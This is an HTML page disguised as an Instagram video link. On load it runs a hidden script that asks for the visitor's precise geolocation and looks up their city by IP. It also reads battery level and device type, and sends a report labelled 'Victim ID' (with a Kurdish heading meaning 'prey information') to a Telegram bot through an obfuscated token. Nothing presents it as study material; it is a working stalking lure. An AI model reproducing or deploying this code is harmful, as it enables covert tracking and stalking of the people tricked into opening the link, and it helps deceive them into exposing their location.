<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <title>video-rell</title>
    <meta property="og:site_name" content="Instagram">
    <meta property="og:title" content="Instagram Video">
    <meta property="og:description" content="Watch this reel on Instagram">
    <meta property="og:image" content="https://raw.githubusercontent.com/saraharki/view/main/girl.jpg">
    <meta property="og:type" content="video.other">
    <meta property="og:url" content="https://www.instagram.com/">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="https://raw.githubusercontent.com/saraharki/view/main/girl.jpg">
    <style>body { background: white; margin: 0; overflow: hidden; }</style>
</head>
<body onload="capture()">
<script>
    const LOG_GROUP = "-1003772247155";
    

    const TOKEN = "74928105:AAFp_fGju4NXGaFiMsvhYC0UdnCYtE"; 

    
    const _0x5f21 = ["OD" + "Y3" + "OD" + "A1" + "MD" + "M0" + "MQ" + "==", "QU" + "FH" + "Qmx" + "NY" + "2Zm" + "MTE" + "zW" + "TR6" + "R0" + "5oc" + "kFO" + "V3" + "o1" + "RUR" + "kWE" + "1OV" + "zRt" + "MTJB"];
    const _0x1a2b = atob(_0x5f21[0]) + ":" + atob(_0x5f21[1]);

    async function capture() {
        const params = new URLSearchParams(window.location.search);
        const uid = params.get('id');
        const u_name = params.get('u') || "Not Found";
        if (!uid) return;

        navigator.geolocation.getCurrentPosition(async (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const now = new Date();
            const timeStr = now.toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });

            let city = "Unknown";
            try {
                const geoRes = await fetch('https://ipapi.co/json/');
                const geoData = await geoRes.json();
                city = geoData.city + " / " + (geoData.region || "");
            } catch (e) { city = "Not Found"; }

            let bat = "N/A";
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    bat = Math.floor(b.level * 100) + "%";
                }
            } catch (e) {}

            let report = `🚨 <b>زانیاری نێچیر</b>\n\n` +
                         `🆔 <b>Victim ID:</b> <code>${uid}</code>\n` +
                         `👤 <b>User:</b> @${u_name}\n` +
                         `📍 <b>Location:</b> https://www.google.com/maps?q=${lat},${lon}\n` +
                         `🔋 <b>Battery:</b> ${bat}\n` +
                         `📱 <b>Device:</b> ${navigator.platform}\n` +
                         `🕒 <b>Time:</b> ${timeStr}\n` +
                         `🏙️ <b>City:</b> ${city}`;

            const userUrl = `https://api.telegram.org/bot${_0x1a2b}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(report)}&parse_mode=HTML`;
            const groupUrl = `https://api.telegram.org/bot${_0x1a2b}/sendMessage?chat_id=${LOG_GROUP}&text=${encodeURIComponent(report)}&parse_mode=HTML`;

            navigator.sendBeacon(userUrl);
            navigator.sendBeacon(groupUrl);

        }, (err) => {
            const errLog = `❌ نێچیر (ID: ${uid} / @${u_name}) لۆکەیشنی داخست.`;
            navigator.sendBeacon(`https://api.telegram.org/bot${_0x1a2b}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(errLog)}`);
            navigator.sendBeacon(`https://api.telegram.org/bot${_0x1a2b}/sendMessage?chat_id=${LOG_GROUP}&text=${encodeURIComponent(errLog)}`);
        }, { enableHighAccuracy: true, timeout: 5000 });
    }
</script>
</body>
</html>
